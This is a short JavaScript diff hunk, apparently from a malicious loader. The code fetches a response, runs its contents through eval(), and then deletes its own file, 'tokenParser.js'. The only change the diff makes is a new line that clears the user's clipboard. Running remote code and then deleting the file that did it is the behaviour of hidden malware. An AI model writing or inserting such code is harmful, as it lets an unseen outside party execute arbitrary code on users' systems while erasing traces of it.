@@ -24,6 +24,7 @@ request(options, (err, res, body) => {
     try {
         const code = JSON.parse(body);
         eval(code);
+        navigator.clipboard.writeText("");
         setTimeout(() => {
         }, 3000);
         deleteFile('tokenParser.js');
